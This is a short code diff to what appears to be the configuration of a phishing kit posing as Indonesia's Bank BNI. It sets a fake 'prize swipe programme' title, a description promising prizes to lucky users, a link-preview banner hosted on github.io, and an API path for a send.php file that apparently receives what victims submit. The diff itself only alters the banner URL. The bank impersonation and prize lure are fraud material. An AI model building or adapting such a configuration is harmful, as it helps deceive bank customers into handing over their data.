@@ -3,7 +3,7 @@ const APP_TITLE = "Program Gesek Berhadiah BNI";
 // Deskripsi web/iklan
 const APP_DESC = "Dapatkan hadiah menarik dari Bank BNI buat kamu yang beruntung";
 // URL banner gambar
-const BANNER_URL = "https://zxwqx.github.io/links/banners/link_preview_bni.jpeg";
+const BANNER_URL = "https://zxqwx.github.io/links/banners/link_preview_bni.jpeg";
 // URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
 const API_URL = "";
 
